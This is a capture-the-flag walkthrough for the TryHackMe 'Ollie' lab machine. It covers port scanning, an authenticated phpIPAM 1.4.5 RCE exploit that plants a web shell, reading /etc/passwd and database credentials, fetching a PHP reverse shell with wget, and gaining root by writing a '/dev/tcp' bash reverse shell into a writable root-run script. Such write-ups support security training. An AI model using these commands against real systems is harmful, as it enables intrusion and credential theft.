# Ollie

URL: https://tryhackme.com/room/ollie

Level: Medium

Date: 25 Aug 2023

- [Reconnaissance](#reconnaissance)
	- [NMAP](#nmap)
	- [Web](#web)
- [Obscure service on port 1337](#obscure-service-on-port-1337)
- [phpIPAM](#phpipam)
	- [RCE](#rce)
	- [Shell](#shell)
	- [LinPEAS](#linpeas)
- [User flag](#user-flag)
- [Privilege Escalation](#privilege-escalation)
- [Root flag](#root-flag)




## Reconnaissance

### nmap

```bash
$ sudo nmap -T4 -p- -n 10.10.187.88 -oA nmap
Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-25 11:32 CEST
Nmap scan report for 10.10.187.88
Host is up (0.058s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
1337/tcp open  waste

Nmap done: 1 IP address (1 host up) scanned in 31.59 seconds
```

```
$ sudo nmap -T4 -p22,80,1337 -sC -sV -n 10.10.187.88 -oA nmap2
Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-25 11:33 CEST
Nmap scan report for 10.10.187.88
Host is up (0.055s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 b71ba8f88c8a4a5355c02e8901f25669 (RSA)
|   256 4e2743b6f454f918d038dacd769b8548 (ECDSA)
|_  256 1482cabb04e501839cd654e9d1fac482 (ED25519)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-robots.txt: 2 disallowed entries
|_/ /immaolllieeboyyy
| http-title: Ollie :: login
|_Requested resource was http://10.10.187.88/index.php?page=login
1337/tcp open  waste?
| fingerprint-strings:
|   DNSStatusRequestTCP, GenericLines:
|     Hey stranger, I'm Ollie, protector of panels, lover of deer antlers.
|     What is your name? What's up,
|     It's been a while. What are you here for?
|   DNSVersionBindReqTCP:
|     Hey stranger, I'm Ollie, protector of panels, lover of deer antlers.
|     What is your name? What's up,
|     version
|     bind
|     It's been a while. What are you here for?
|   GetRequest:
|     Hey stranger, I'm Ollie, protector of panels, lover of deer antlers.
|     What is your name? What's up, Get / http/1.0
|     It's been a while. What are you here for?
|   HTTPOptions:
|     Hey stranger, I'm Ollie, protector of panels, lover of deer antlers.
|     What is your name? What's up, Options / http/1.0
|     It's been a while. What are you here for?
|   Help:
|     Hey stranger, I'm Ollie, protector of panels, lover of deer antlers.
|     What is your name? What's up, Help
|     It's been a while. What are you here for?
|   NULL, RPCCheck:
|     Hey stranger, I'm Ollie, protector of panels, lover of deer antlers.
|     What is your name?
|   RTSPRequest:
|     Hey stranger, I'm Ollie, protector of panels, lover of deer antlers.
|     What is your name? What's up, Options / rtsp/1.0
|_    It's been a while. What are you here for?
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port1337-TCP:V=7.93%I=7%D=8/25%Time=64E87578%P=x86_64-pc-linux-gnu%r(NU
SF:LL,59,"Hey\x20stranger,\x20I'm\x20Ollie,\x20protector\x20of\x20panels,\
SF:x20lover\x20of\x20deer\x20antlers\.\n\nWhat\x20is\x20your\x20name\?\x20
SF:")%r(GenericLines,93,"Hey\x20stranger,\x20I'm\x20Ollie,\x20protector\x2
SF:0of\x20panels,\x20lover\x20of\x20deer\x20antlers\.\n\nWhat\x20is\x20you
SF:r\x20name\?\x20What's\x20up,\x20\r\n\r!\x20It's\x20been\x20a\x20while\.
SF:\x20What\x20are\x20you\x20here\x20for\?\x20")%r(GetRequest,A1,"Hey\x20s
SF:tranger,\x20I'm\x20Ollie,\x20protector\x20of\x20panels,\x20lover\x20of\
SF:x20deer\x20antlers\.\n\nWhat\x20is\x20your\x20name\?\x20What's\x20up,\x
SF:20Get\x20/\x20http/1\.0\r\n\r!\x20It's\x20been\x20a\x20while\.\x20What\
SF:x20are\x20you\x20here\x20for\?\x20")%r(HTTPOptions,A5,"Hey\x20stranger,
SF:\x20I'm\x20Ollie,\x20protector\x20of\x20panels,\x20lover\x20of\x20deer\
SF:x20antlers\.\n\nWhat\x20is\x20your\x20name\?\x20What's\x20up,\x20Option
SF:s\x20/\x20http/1\.0\r\n\r!\x20It's\x20been\x20a\x20while\.\x20What\x20a
SF:re\x20you\x20here\x20for\?\x20")%r(RTSPRequest,A5,"Hey\x20stranger,\x20
SF:I'm\x20Ollie,\x20protector\x20of\x20panels,\x20lover\x20of\x20deer\x20a
SF:ntlers\.\n\nWhat\x20is\x20your\x20name\?\x20What's\x20up,\x20Options\x2
SF:0/\x20rtsp/1\.0\r\n\r!\x20It's\x20been\x20a\x20while\.\x20What\x20are\x
SF:20you\x20here\x20for\?\x20")%r(RPCCheck,59,"Hey\x20stranger,\x20I'm\x20
SF:Ollie,\x20protector\x20of\x20panels,\x20lover\x20of\x20deer\x20antlers\
SF:.\n\nWhat\x20is\x20your\x20name\?\x20")%r(DNSVersionBindReqTCP,B0,"Hey\
SF:x20stranger,\x20I'm\x20Ollie,\x20protector\x20of\x20panels,\x20lover\x2
SF:0of\x20deer\x20antlers\.\n\nWhat\x20is\x20your\x20name\?\x20What's\x20u
SF:p,\x20\0\x1e\0\x06\x01\0\0\x01\0\0\0\0\0\0\x07version\x04bind\0\0\x10\0
SF:\x03!\x20It's\x20been\x20a\x20while\.\x20What\x20are\x20you\x20here\x20
SF:for\?\x20")%r(DNSStatusRequestTCP,9E,"Hey\x20stranger,\x20I'm\x20Ollie,
SF:\x20protector\x20of\x20panels,\x20lover\x20of\x20deer\x20antlers\.\n\nW
SF:hat\x20is\x20your\x20name\?\x20What's\x20up,\x20\0\x0c\0\0\x10\0\0\0\0\
SF:0\0\0\0\0!\x20It's\x20been\x20a\x20while\.\x20What\x20are\x20you\x20her
SF:e\x20for\?\x20")%r(Help,95,"Hey\x20stranger,\x20I'm\x20Ollie,\x20protec
SF:tor\x20of\x20panels,\x20lover\x20of\x20deer\x20antlers\.\n\nWhat\x20is\
SF:x20your\x20name\?\x20What's\x20up,\x20Help\r!\x20It's\x20been\x20a\x20w
SF:hile\.\x20What\x20are\x20you\x20here\x20for\?\x20");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 162.99 seconds

```


### web

![](Pasted%20image%2020230825113551.png)

We see a reference to an IPAM software in page source

```html
<!-- Page footer -->
<div class="footer"><table class="donate">
<tr>
	<td>
		<a href="[http://phpipam.net](view-source:http://phpipam.net/)">phpIPAM IP address management [v1.4.5]</a>
			</td>
```

`admin/admin` is not working here


![](Pasted%20image%2020230825113744.png)

neither `admin/ipamadmin`

We got a disallowed entry in `robots.txt`: `/immaolllieeboyyy/`

Nothing interesting here:

```bash
$ curl -v http://10.10.187.88/immaolllieeboyyy/
*   Trying 10.10.187.88:80...
* Connected to 10.10.187.88 (10.10.187.88) port 80 (#0)
> GET /immaolllieeboyyy/ HTTP/1.1
> Host: 10.10.187.88
> User-Agent: curl/7.87.0
> Accept: */*
>
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< Date: Fri, 25 Aug 2023 09:41:24 GMT
< Server: Apache/2.4.41 (Ubuntu)
< Last-Modified: Tue, 08 Feb 2022 01:41:29 GMT
< ETag: "5a-5d777d0eb213e"
< Accept-Ranges: bytes
< Content-Length: 90
< Vary: Accept-Encoding
< Content-Type: text/html
<
<meta http-equiv="refresh" content="0;url=https://www.youtube.com/watch?v=YIWSEa5U9_U" />
* Connection #0 to host 10.10.187.88 left intact
```

## obscure service on port 1337

```bash
$ telnet 10.10.187.88 1337
Trying 10.10.187.88...
Connected to 10.10.187.88.
Escape character is '^]'.
Hey stranger, I'm Ollie, protector of panels, lover of deer antlers.

What is your name? ollie
! It's been a while. What are you here for? password
. If you can answer a question about me, I might have something for you.


What breed of dog am I? I'll make it a multiple choice question to keep it easy: Bulldog, Husky, Duck or Wolf? Duck
You are wrong! I'm sorry, but this is serious business. Let's try again...


What breed of dog am I? I'll make it a multiple choice question to keep it easy: Bulldog, Husky, Duck or Wolf? Wolf
You are wrong! I'm sorry, but this is serious business. Let's try again...


What breed of dog am I? I'll make it a multiple choice question to keep it easy: Bulldog, Husky, Duck or Wolf? Bulldog
You are correct! Let me confer with my trusted colleagues; Benny, Baxter and Connie...
Please hold on a minute
Ok, I'm back.
After a lengthy discussion, we've come to the conclusion that you are the right person for the job.Here are the credentials for our administration panel.

                    Username: admin

                    Password: OllieUnixMontgomery!

PS: Good luck and next time bring some treats!

Connection closed by foreign host.

```

so far, we got credentials for website.

![](Pasted%20image%2020230825114525.png)

![](Pasted%20image%2020230825114708.png)

## phpIPAM

version:

`[phpIPAM IP address management [v1.4.5]](http://phpipam.net)`

It seems there is an RCE

```bash
$ searchsploit phpipam
------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                                                              |  Path
------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
PHPIPAM 1.1.010 - Multiple Vulnerabilities                                                                                                                  | php/webapps/39171.txt
PHPIPAM 1.2.1 - Multiple Vulnerabilities                                                                                                                    | php/webapps/40338.txt
phpIPAM 1.4 - SQL Injection                                                                                                                                 | php/webapps/47438.py
PHPIPAM 1.4.4 - SQLi (Authenticated)                                                                                                                        | php/webapps/50684.py
phpIPAM 1.4.5 - Remote Code Execution (RCE) (Authenticated)                                                                                                 | php/webapps/50963.py
------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
```

### RCE

```bash
joshua@kaligra:~/Documents/thm/ollie$ searchsploit -m php/webapps/50963.py
  Exploit: phpIPAM 1.4.5 - Remote Code Execution (RCE) (Authenticated)
      URL: https://www.exploit-db.com/exploits/50963
     Path: /usr/share/exploitdb/exploits/php/webapps/50963.py
    Codes: N/A
 Verified: False
File Type: Python script, Unicode text, UTF-8 text executable
Copied to: /home/joshua/Documents/thm/ollie/50963.py


joshua@kaligra:~/Documents/thm/ollie$ 
```

```bash
$ python3 50963.py

█▀█ █░█ █▀█ █ █▀█ ▄▀█ █▀▄▀█   ▄█ ░ █░█ ░ █▀   █▀ █▀█ █░░ █   ▀█▀ █▀█   █▀█ █▀▀ █▀▀
█▀▀ █▀█ █▀▀ █ █▀▀ █▀█ █░▀░█   ░█ ▄ ▀▀█ ▄ ▄█   ▄█ ▀▀█ █▄▄ █   ░█░ █▄█   █▀▄ █▄▄ ██▄

█▄▄ █▄█   █▄▄ █▀▀ █░█ █ █▄░█ █▀▄ █▄█ █▀ █▀▀ █▀▀
█▄█ ░█░   █▄█ ██▄ █▀█ █ █░▀█ █▄▀ ░█░ ▄█ ██▄ █▄▄

usage: ./exploit.py -url http://domain.tld/ipam_base_url -usr username -pwd password -cmd 'command_to_execute' --path /system/writable/path/to/save/shell
50963.py: error: the following arguments are required: -url, -usr, -pwd
```

```bash
joshua@kaligra:~/Documents/thm/ollie$ python3 ./50963.py -url http://10.10.187.88/ -usr admin -pwd "OllieUnixMontgomery!" -cmd 'id'

█▀█ █░█ █▀█ █ █▀█ ▄▀█ █▀▄▀█   ▄█ ░ █░█ ░ █▀   █▀ █▀█ █░░ █   ▀█▀ █▀█   █▀█ █▀▀ █▀▀
█▀▀ █▀█ █▀▀ █ █▀▀ █▀█ █░▀░█   ░█ ▄ ▀▀█ ▄ ▄█   ▄█ ▀▀█ █▄▄ █   ░█░ █▄█   █▀▄ █▄▄ ██▄

█▄▄ █▄█   █▄▄ █▀▀ █░█ █ █▄░█ █▀▄ █▄█ █▀ █▀▀ █▀▀
█▄█ ░█░   █▄█ ██▄ █▀█ █ █░▀█ █▄▀ ░█░ ▄█ ██▄ █▄▄

[...] Trying to log in as admin
[+] Login successful!
[...] Exploiting
[+] Success! The shell is located at http://10.10.187.88/evil.php. Parameter: cmd


[+] Output:
1        uid=33(www-data) gid=33(www-data) groups=33(www-data)
        3       4
```

From here, we can simply use cURL

```bash
$ curl http://10.10.187.88/evil.php?cmd=id
1        uid=33(www-data) gid=33(www-data) groups=33(www-data)
        3       4
```

`/etc/passwd`

```bash
$ curl http://10.10.187.88/evil.php?cmd=cat%20/etc/passwd
1        root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:112:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
ollie:x:1000:1000:ollie unix montgomery:/home/ollie:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
mysql:x:113:118:MySQL Server,,,:/nonexistent:/bin/false
dnsmasq:x:114:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
```

We try to access with SSH, but we need private key:

```bash
joshua@kaligra:~/Documents/thm/ollie$ ssh ollie@10.10.187.88
The authenticity of host '10.10.187.88 (10.10.187.88)' can't be established.
ED25519 key fingerprint is SHA256:gPv72J/iRV3IOpuknvOf68vFB7zZeRSj5qTXJLtJX4k.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.187.88' (ED25519) to the list of known hosts.
ollie@10.10.187.88: Permission denied (publickey).
```

Let's check for some other juicy config file:


```bash
$ curl http://10.10.187.88/evil.php?cmd=cat%20/var/www/html/config.php
1        <?php

/**
 * database connection details
 ******************************/
$db['host'] = 'localhost';
$db['user'] = 'phpipam_ollie';
$db['pass'] = 'IamDah1337estHackerDog!';
$db['name'] = 'phpipam';
$db['port'] = 3306;

..
..



/**
 * SAML mappings
 ******************************/
if(!defined('MAP_SAML_USER'))
define('MAP_SAML_USER', true);    // Enable SAML username mapping

if(!defined('SAML_USERNAME'))
define('SAML_USERNAME', 'admin'); // Map SAML to explicit user

..
..
```

Ok, we have `wget` on remote target

```bash
joshua@kaligra:~/Documents/thm/ollie$ curl http://10.10.187.88/evil.php?cmd=which%20wget
1        /usr/bin/wget
        3       4
```

```bash
joshua@kaligra:~/Documents/thm/ollie$ python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
10.10.187.88 - - [25/Aug/2023 12:05:23] code 404, message File not found
10.10.187.88 - - [25/Aug/2023 12:05:23] "GET /shell.phop HTTP/1.1" 404 -
10.10.187.88 - - [25/Aug/2023 12:05:26] "GET /shell.php HTTP/1.1" 200 -
```

```bash
$ curl http://10.10.187.88/evil.php?cmd=wget%20http://10.8.100.14:8080/shell.php
1               3       4
```

spawn netcat listener

```bash
joshua@kaligra:~/Documents/thm/ollie$ nc -lnvp 4444
listening on [any] 4444 ...
```

Mm, we can't write to document_root, let's check permissions

```
joshua@kaligra:~/Documents/thm/ollie$ curl http://10.10.187.88/evil.php?cmd=ls%20-l
1        total 92
-rwxrwxr-x   1 ollie    ollie      111 Jan 17  2022 INSTALL.txt
-rwxrwxr-x   1 ollie    ollie     1652 Jan 17  2022 README.md
-rwxrwxr-x   1 ollie    ollie      105 Jan 17  2022 UPDATE
drwxrwxr-x   3 ollie    ollie     4096 Jan 17  2022 api
drwxrwxr-x  16 ollie    ollie     4096 Jan 17  2022 app
-rw-rw-r--   1 ollie    ollie     3071 Jan 17  2022 config.docker.php
-rwxrwxr-x   1 ollie    ollie     6711 Feb  6  2022 config.php
drwxrwxr-x   8 ollie    ollie     4096 Jan 17  2022 css
drwxrwxr-x   4 ollie    ollie     4096 Jan 17  2022 db
-rw-r-----+  1 mysql    mysql       43 Aug 25 09:53 evil.php
drwxrwxr-x  14 ollie    ollie     4096 Feb  6  2022 functions
drwxrwxr-x+  2 www-data www-data  4096 Feb 10  2022 imgs
drwxrwxr-x+  2 www-data www-data  4096 Feb  8  2022 immaolllieeboyyy
-rwxrwxr-x   1 ollie    ollie    14302 Feb 12  2022 index.php
drwxrwxr-x   2 ollie    ollie     4096 Jan 17  2022 install
drwxrwxr-x   7 ollie    ollie     4096 Jan 17  2022 js
drwxrwxr-x   2 ollie    ollie     4096 Jan 17  2022 misc
-rw-rw-r--   1 ollie    ollie       54 Feb  9  2022 robots.txt
drwxrwxr-x   2 ollie    ollie     4096 Jan 17  2022 upgrade

```

path `/imgs` is fine:

```bash
$ curl http://10.10.187.88/evil.php?cmd=wget%20http://10.8.100.14:8080/shell.php%20-O%20imgs/shell.php
```


### shell

```bash
joshua@kaligra:~/Documents/thm/ollie$ nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.8.100.14] from (UNKNOWN) [10.10.187.88] 52542
Linux hackerdog 5.4.0-99-generic #112-Ubuntu SMP Thu Feb 3 13:50:55 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
 10:09:24 up 40 min,  0 users,  load average: 0.00, 0.02, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$
```

```
joshua@kaligra:~/Documents/thm/ollie$ stty raw -echo
joshua@kaligra:~/Documents/thm/ollie$
nc -lnvp 4444

www-data@hackerdog:/$
www-data@hackerdog:/$
www-data@hackerdog:/$
www-data@hackerdog:/$
```

```bash
www-data@hackerdog:/$ ps aux |grep ollie
root        1350  0.0  0.3   8248  7024 ?        Ss   09:30   0:00 python3 -u olliebot.py
www-data    2610  0.0  0.0   6500   736 pts/0    S+   10:11   0:00 grep ollie
```

### linpeas

lot's of info, but at the end... password reuse! :(

## user flag

```bash
www-data@hackerdog:/home/ollie$ su - ollie
Password: OllieUn.....
ollie@hackerdog:~$ id
uid=1000(ollie) gid=1000(ollie) groups=1000(ollie),4(adm),24(cdrom),30(dip),46(plugdev)
ollie@hackerdog:~$ cat user.txt
THM{OllieXXXXXXXXXXXXXX}
```



## privilege escalation

```bash
ollie@hackerdog:~$ crontab -l
no crontab for ollie
ollie@hackerdog:~$ sudo -l
[sudo] password for ollie:
Sorry, user ollie may not run sudo on hackerdog.
ollie@hackerdog:~$
```


olliebot process?

```bash
ollie@hackerdog:~$ ps aux |grep ollie
root        1350  0.0  0.2   8248  5468 ?        Ss   09:30   0:00 python3 -u olliebot.py
root       34055  0.0  0.1   9000  3760 pts/0    S    10:50   0:00 su - ollie

```

We didn't find such file within filesystem.

Let's check with pspy:


```bash
2023/08/25 11:05:01 CMD: UID=0    PID=71016  | (feedme)
2023/08/25 11:05:01 CMD: UID=0    PID=71028  | /lib/systemd/systemd-udevd
2023/08/25 11:05:01 CMD: UID=0    PID=71027  | /lib/systemd/systemd-udevd
2023/08/25 11:05:01 CMD: UID=0    PID=71026  | /lib/systemd/systemd-udevd
2023/08/25 11:05:01 CMD: UID=0    PID=71025  | /lib/systemd/systemd-udevd
2023/08/25 11:05:01 CMD: UID=0    PID=71024  | /lib/systemd/systemd-udevd
2023/08/25 11:05:01 CMD: UID=0    PID=71023  | /lib/systemd/systemd-udevd
2023/08/25 11:05:01 CMD: UID=0    PID=71022  | /lib/systemd/systemd-udevd
2023/08/25 11:05:01 CMD: UID=0    PID=71021  | /lib/systemd/systemd-udevd
2023/08/25 11:05:01 CMD: UID=0    PID=71020  | /lib/systemd/systemd-udevd
2023/08/25 11:05:01 CMD: UID=0    PID=71019  | /lib/systemd/systemd-udevd
2023/08/25 11:05:01 CMD: UID=0    PID=71030  | /lib/systemd/systemd-udevd
2023/08/25 11:05:01 CMD: UID=0    PID=71029  | /lib/systemd/systemd-udevd
2023/08/25 11:05:25 CMD: UID=0    PID=71031  | ps -e -o pid,ppid,state,command
2023/08/25 11:06:01 CMD: UID=0    PID=71033  | /lib/systemd/systemd-udevd
2023/08/25 11:06:01 CMD: UID=0    PID=71032  | (feedme)

```

we noticed "feedme" process.

```bash
ollie@hackerdog:~$ which feedme
ollie@hackerdog:~$ find / -type f -name feedme 2>/dev/null
/usr/bin/feedme
```

```bash
ollie@hackerdog:~$ cat /usr/bin/feedme
#!/bin/bash

# This is weird?
```

We have write permission:

```bash
ollie@hackerdog:~$ ls -lh /usr/bin/feedme
-rwxrw-r-- 1 root ollie 30 Feb 12  2022 /usr/bin/feedme
```

let's add a reverse tcp shell:

```bash
ollie@hackerdog:/usr/bin$ cat feedme
#!/bin/bash

# This is weird?
bash -i >& /dev/tcp/10.8.100.14/5555 0>&1
```

## root flag

```bash
joshua@kaligra:~$ nc -nvlp 5555
listening on [any] 5555 ...
connect to [10.8.100.14] from (UNKNOWN) [10.10.187.88] 46642
bash: cannot set terminal process group (71195): Inappropriate ioctl for device
bash: no job control in this shell
root@hackerdog:/# id
id
uid=0(root) gid=0(root) groups=0(root)
root@hackerdog:/# cd rot
cd rot
bash: cd: rot: No such file or directory
root@hackerdog:/# cd root
cd root
root@hackerdog:~# ls
ls
root.txt
snap
root@hackerdog:~# cat root.txt
cat root.txt
THM{Ollie_LuvsXXXXXXX}
root@hackerdog:~#

```